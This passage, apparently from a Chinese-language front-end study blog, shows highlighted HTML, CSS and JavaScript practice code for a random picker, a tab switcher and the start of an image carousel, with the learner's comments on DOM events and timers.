class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;background-image: url(./img/_10.jpg);&quot;</span>&gt;</span>本年度最佳主角<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">&quot;display: block;width: 800px;margin: 30px auto;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span> <span class="attr">style</span>=<span class="string">&quot;background: url(./img/_10.jpg) no-repeat center/cover;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>3号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>4号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span> <span class="attr">style</span>=<span class="string">&quot;background: url(./img/_12.jpg) no-repeat center/cover;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>5号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>6号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>7号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>8号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span> <span class="attr">style</span>=<span class="string">&quot;background: url(./img/_11.jpg) no-repeat center/cover;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>9号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>10号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>11号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>12号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span>&gt;</span>开始<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- ------------------------------------------ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span>&gt;</span>1<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span>&gt;</span>2<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span>&gt;</span>3<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span>&gt;</span>4<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">botton</span>&gt;</span>5<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;li2&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;li2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;li2&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:block; background: url(./img/_11.jpg) no-repeat center/cover;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background: url(./img/_12.jpg) no-repeat center/cover;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background: url(./img/_13.jpg) no-repeat center/cover;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="javascript"><span class="comment">//两个练习-----------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;botton&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//随机抽图</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//用js初始化li背景</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> li=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(li.length);</span></span><br><span class="line"><span class="javascript">        <span class="comment">// for(var i=0;i&lt;li.length;i++)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     li[i].style.background=&quot;pink&quot;;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> timer;<span class="comment">//需要定义为全局变量</span></span></span><br><span class="line"><span class="javascript">        btn[<span class="number">0</span>].onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(btn[<span class="number">0</span>].innerHTML==<span class="string">&quot;开始&quot;</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                timer=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">                &#123;</span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> index=<span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random()*li.length);<span class="comment">//math.floor()等效</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">// li[index].style.background=&quot;none&quot;;</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; li.length; i++) </span></span><br><span class="line">                    &#123;</span><br><span class="line"><span class="javascript">                        li[i].style.opacity=<span class="string">&quot;0&quot;</span>;</span></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                    li[index].style.opacity = <span class="string">&quot;1&quot;</span>;</span></span><br><span class="line">                &#125;,500)</span><br><span class="line"><span class="javascript">                btn[<span class="number">0</span>].innerHTML=<span class="string">&quot;结束&quot;</span></span></span><br><span class="line"><span class="javascript">            &#125;<span class="keyword">else</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line"><span class="javascript">                btn[<span class="number">0</span>].innerHTML=<span class="string">&quot;开始&quot;</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//--------------随机提名--------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// arr = [&quot;1号&quot;, &quot;2号&quot;, &quot;3号&quot;, &quot;4号&quot;, &quot;5号&quot;, &quot;6号&quot;, &quot;7号&quot;, &quot;8号&quot;, &quot;9号&quot;, &quot;10号&quot;, &quot;11号&quot;, &quot;12号&quot;]</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> op = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> td=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;td&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> timer2;</span></span><br><span class="line"><span class="javascript">        btn[<span class="number">1</span>].onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (btn[<span class="number">1</span>].innerHTML==<span class="string">&quot;开始&quot;</span>) </span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                timer2=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">                &#123;</span><br><span class="line">                </span><br><span class="line"><span class="javascript">                    <span class="comment">// alert(&quot;测试绑定成功&quot;);</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">var</span> index = <span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random() * td.length);<span class="comment">//这里利用了td返回的是伪数组</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; td.length; i++) </span></span><br><span class="line">                    &#123;</span><br><span class="line"><span class="javascript">                        td[i].style.background = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                    td[index].style.background = <span class="string">&quot;pink&quot;</span>;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// td[index].style.background = &quot;url(./img/_&quot;+(index+10)+&quot;.jpg))&quot;;//错误</span></span></span><br><span class="line">                    op.innerHTML=td[index].innerHTML;</span><br><span class="line">                &#125;,50)</span><br><span class="line"><span class="javascript">                btn[<span class="number">1</span>].innerHTML=<span class="string">&quot;结束&quot;</span>;</span></span><br><span class="line"><span class="javascript">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">clearInterval</span>(timer2);<span class="comment">//计时器停止后，已产生的样式会保留</span></span></span><br><span class="line"><span class="javascript">                btn[<span class="number">1</span>].innerHTML=<span class="string">&quot;开始&quot;</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="javascript"><span class="comment">//=============================================</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//选项卡，类似于实现hover的功能，但是hover前提是要与当前元素有关系才可以，如果没有关系也无能为力，而且，用js可能更方便</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//多个按钮绑定事件</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(btn);<span class="comment">//这里对后5个按钮进行绑定</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">2</span>;i&lt;btn.length;i++)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i);</span></span><br><span class="line"><span class="javascript">            btn[i].indexx=i;<span class="comment">//可以自定义属性indexx，将i中间过程产生的值作为属性值赋值，存储在其中</span></span></span><br><span class="line"><span class="javascript">            btn[i].onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(i);<span class="comment">//使用var声明的i，在绑定事件时i已经变成了7</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="built_in">this</span>.indexx);<span class="comment">//在不使用let定义的情况想，使用this指针来实现，这里的this指向触发源，返回触发源对象（猜的）</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript"><span class="comment">//-----------------------------------------</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//选项卡，仅次于轮播图重要的第二重要point</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> oli=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(oli);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> odiv=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(odiv);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(oli.length)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(odiv.length)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">40</span>;i&lt;oli.length;i++)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i);</span></span><br><span class="line"><span class="javascript">            oli[i].savexiabiao=i;<span class="comment">//这里相当于给oli创建了一个对象属性</span></span></span><br><span class="line"><span class="javascript">            oli[i].onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;odiv.length;j++)</span></span><br><span class="line">                &#123;</span><br><span class="line"><span class="javascript">                    odiv[j].style.display=<span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                odiv[<span class="built_in">this</span>.savexiabiao-<span class="number">39</span>].style.display=<span class="string">&quot;block&quot;</span>;<span class="comment">//this指向该触发源对象的这个属性，注意这里需要两个下标数字保持一致，所以要-39</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day15-DOM事件"><a href="#day15-DOM事件" class="headerlink" title="day15  DOM事件"></a>day15  DOM事件</h2><h3 id="DOM事件-鼠标移入移出-双击事件"><a href="#DOM事件-鼠标移入移出-双击事件" class="headerlink" title="DOM事件    鼠标移入移出    双击事件"></a>DOM事件    鼠标移入移出    双击事件</h3><h3 id="轮播图"><a href="#轮播图" class="headerlink" title="轮播图"></a>轮播图</h3><p>DOM事件用法汇总：<a href="https://www.runoob.com/jsref/dom-obj-event.html">https://www.runoob.com/jsref/dom-obj-event.html</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day15轮播图<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        *&#123;</span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">list-style</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .banner&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin</span>: <span class="number">50px</span> auto;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/Tuscany_Italy_1.jpg</span>) no-repeat center/cover;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/t0167ff75428a5b8211.jpg</span>) no-repeat center/cover;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/t012bc4db930763a54e.jpg</span>) no-repeat center/cover;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/QQ截图20210528232421.jpg</span>) no-repeat center/cover;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">5</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/[千千結]83747940.jpg</span>) no-repeat center/cover;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">6</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/80314324.jpg</span>) no-repeat center/cover;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .button&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">140px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">button</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">button</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">right</span>: <span class="number">0</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>双击按钮事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background:blue;width:300px;height:300px;box-shadow: 0 0 2px 0 red;transition: 0.3s;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- 注：忘记加单位px会导致height不作用，表现为空 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 轮播图 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 先写出静态页面，之后再添加js实现动态效果 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;banner&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;display: block;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span>&gt;</span>&lt;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span>&gt;</span>&gt;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//tips:使用.style.cssText可以在同一行中写入多个style属性</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//DOM其他事件</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//oneclick 单击事件</span></span></span><br><span class="line"><span class="javascript">        <span 